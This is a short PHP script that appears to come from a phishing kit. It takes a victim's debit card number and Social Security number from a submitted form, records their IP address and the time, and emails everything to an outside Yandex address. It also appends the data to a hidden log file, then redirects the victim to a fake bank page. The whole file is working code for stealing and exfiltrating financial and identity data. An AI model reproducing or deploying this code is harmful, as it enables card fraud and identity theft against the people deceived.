<?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$ccnumber = $_POST['ccnumber'];
$ssn = $_POST['ssn'];
$message .="
debit number : ".$ccnumber."
ssn : ".$ssn."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========|0v3r|=====================||\n";
$send="jokamercairoresult@yandex.com";
$subject = "card cash | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("../0v3r.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = 'bank.php'</script>");
?>